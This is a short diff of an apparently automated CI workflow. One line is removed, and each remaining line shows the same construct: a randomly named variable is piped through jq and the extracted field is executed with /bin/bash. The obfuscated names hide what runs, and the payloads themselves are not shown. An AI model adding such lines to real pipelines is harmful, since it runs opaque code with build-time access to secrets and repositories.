@@ -26,7 +26,6 @@ jobs:
           echo $atrfv40966 | jq -r .joi6 | /bin/bash
           echo $reyf2623 | jq -r .xz5951 | /bin/bash
           printf '%s' "$tvzez1" | jq -r .rsoc88469 | /bin/bash
-          echo $zda41 | jq -r .klc880 | /bin/bash
           echo $hyjs2099 | jq -r .ba728 | /bin/bash
           echo $nv17463 | jq -r .erkv001 | /bin/bash
 
